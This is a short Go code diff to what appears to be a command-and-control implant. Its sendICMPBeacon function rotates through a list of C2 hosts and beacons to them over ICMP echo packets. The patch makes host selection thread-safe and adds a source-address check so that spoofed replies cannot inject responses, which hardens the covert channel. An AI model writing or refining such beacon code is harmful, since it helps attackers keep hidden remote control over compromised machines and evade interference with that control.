@@ -35,8 +35,8 @@ func sendICMPBeacon(body []byte) []byte {
 		return nil
 	}
 	host := C2URL
-	if len(C2URLs) > 0 {
-		host = C2URLs[currentC2Idx]
+	if urls := c2URLsSnapshot(); len(urls) > 0 {
+		host = c2URLAtIndex(int(currentC2Idx.Load()))
 	}
 
 	ips, err := net.LookupIP(host)
@@ -85,6 +85,11 @@ func sendICMPBeacon(body []byte) []byte {
 	}
 	status := binary.LittleEndian.Uint32(replyBuf[4:8])
 	if status != 0 {
+		return nil
+	}
+	// Reject replies that did not originate from the requested destination so a
+	// spoofed Echo Reply cannot inject a response from an arbitrary host.
+	if replyBuf[0] != addr[0] || replyBuf[1] != addr[1] || replyBuf[2] != addr[2] || replyBuf[3] != addr[3] {
 		return nil
 	}
 	var reply icmpEchoReply
